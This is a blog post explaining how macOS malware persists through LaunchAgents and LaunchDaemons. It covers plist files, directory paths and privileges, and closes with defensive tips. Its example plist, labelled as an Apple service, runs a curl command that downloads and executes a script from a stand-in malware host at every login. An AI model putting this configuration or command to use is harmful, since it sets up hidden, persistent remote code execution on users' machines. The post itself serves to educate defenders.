---
layout: post
title: "Malware Persistence Mechanisms: Exploring LaunchAgents and LaunchDaemons on macOS"
date: 2023-04-17 18:30:00 +0300
categories: security
---
In the intricate framework of macOS boot/startup, a crucial step immediately after the kernel initialization is the initiation of `launchd`. Acting as the kernel's progeny, `launchd` is the first process to emerge in user mode. It plays a multifaceted role, with its primary responsibilities revolving around the initialization and scheduling of all system services and processes. This duty crucially includes launching both Agents and Daemons.

Apple officially recommends launch daemons and agents as the method for maintaining the persistence of non-application binaries, such as software updaters, antivirus products, and more. Regrettably, macOS malware often exploits both launch daemons and launch agents to achieve persistence. Launch daemons, being non-interactive, run before user login, while launch agents, which may be interactive, run after the user has logged in. To create a persistently launched daemon or agent, one simply needs to create the binary and then place a configuration property list in one of the respective directories.

## Understanding Property Lists: The Backbone of Agents and Daemons

Agents and Daemons, critical components of the macOS operating system, derive their instructions from their respective property list (.plist) files. Acting as command repositories, these .plist files provide explicit instructions on when and how Agents and Daemons are to be launched. This set of predefined rules plays a pivotal role in ensuring the smooth functioning of the system, achieving a balance between process management and resource allocation.

`LaunchAgents` and `LaunchDaemons` property list files can serve a dual role: they can either pinpoint a file to be executed or directly encapsulate the commands to be executed. Property lists (or 'plists'), as per Apple's terminology, are XML files utilized by macOS to store serialized objects. For every launch daemon or agent, there exists a corresponding plist that holds the essential configuration information. These files are processed as a part of the OS initialization process and can encompass key-value pairs that command the OS to initiate the daemon or agent automatically.

To ensure the correct syntax of a plist file, the property list utility (`plutil`) can be used. Particularly, the `-p` option allows printing the property list in a human-readable fashion, irrespective of its original format. This option is useful for easily reading the contents of a plist file. Here is an example command:

{% highlight sh %}
plutil -p /path/to/plist/file
{% endhighlight %}

Let's consider an example of a property list file:

{% highlight xml %}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.malware</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>curl -O http://malware.com/malware.sh; sh malware.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
{% endhighlight %}

The above example illustrates how a script from a remote server can be configured to be downloaded and executed each time the user logs in, thus underscoring the power and flexibility that property lists provide to LaunchAgents and LaunchDaemons.

## Malware Persistence through LaunchAgents

`LaunchAgents` serve as one of the most common methods for establishing malware persistence on macOS. Each user on a Mac possesses a dedicated `LaunchAgents` folder within their `Library` directory, located at `~/Library/LaunchAgents/`. This allows code to be executed each time the specific user logs in. Additionally, a system-level `LaunchAgents` folder, located at `/Library/LaunchAgents/`, facilitates the execution of code for all users upon login. Although there is a `LaunchAgents` directory for system use at `/System/Library/LaunchAgents/`, macOS, from version 10.11 onwards, manages this location, preventing unauthorized access by malware, as long as System Integrity Protection is enabled and remains intact.

`LaunchAgents` at the user level serve as the most prevalent form of persistence in real-world scenarios, primarily due to the fact that their installation does not require elevated privileges. However, starting with OSX 10.7 Lion, Apple made the arguably controversial decision to hide the parent Library directory from users by default. This decision inadvertently simplifies the task for threat actors attempting to hide these agents, especially from less technically-inclined users.

## Persistence through LaunchDaemons

Daemons, acting as system services, commence their operation during the boot process, even before any user logs in, thus maintaining a level of autonomy from individual user sessions. These Daemons follow instructions from their respective .plist files located at specific paths.

Daemons' .plist files are primarily located in two paths. The first one is `/System/Library/LaunchDaemons/`, reserved exclusively for Apple-specific Daemons. Given its sensitive nature, Apple has imposed restrictions on this location, securing its contents by making it read-only.

The second path, `/Library/LaunchDaemons/`, caters to third-party Daemons. Unlike its Apple-specific counterpart, this location is not as tightly restricted. However, it's important to note that any modifications to this path, such as writing a new daemon, necessitate root permissions. This serves as a security measure against unauthorized alterations.

Unfortunately, `LaunchDaemons`, owing to their inherent non-interactive nature and initiation before user login, often become prime targets for malware. These illicit software pieces exploit these characteristics to achieve persistence. Therefore, writing a daemon to `/Library/LaunchDaemons` requires administrator-level privileges. However, this often isn't a significant obstacle. Since most Mac users often grant authorization for software installation, this security requirement is frequently bypassed, making the system vulnerable to infections in the wild.

## Strengthening System Security

Overall, while launch daemons and agents provide a legitimate and convenient way for software to maintain persistence on macOS, their simplicity and ease of use also make them vulnerable to exploitation by malware. Users and administrators should remain vigilant and monitor the contents of launch daemon and agent directories to detect any suspicious or unauthorized activity.

To further protect your system, consider adopting the following security practices:

1. Regularly update your operating system and applications to ensure you have the latest security patches.
2. Install a reputable antivirus solution and keep it up to date.
3. Be cautious when downloading software or opening email attachments, especially from unknown sources.
4. Limit user account privileges, using administrator accounts only when necessary.
5. Implement strong and unique passwords for all user accounts.
6. Enable macOS's built-in security features, such as FileVault for disk encryption and the built-in firewall.
7. Regularly back up your data to protect against data loss in case of a malware attack.

By understanding how malware leverages `LaunchAgents` and `LaunchDaemons` for persistence and implementing robust security measures, you can significantly reduce the risk of infection and protect your macOS system from threats in the wild.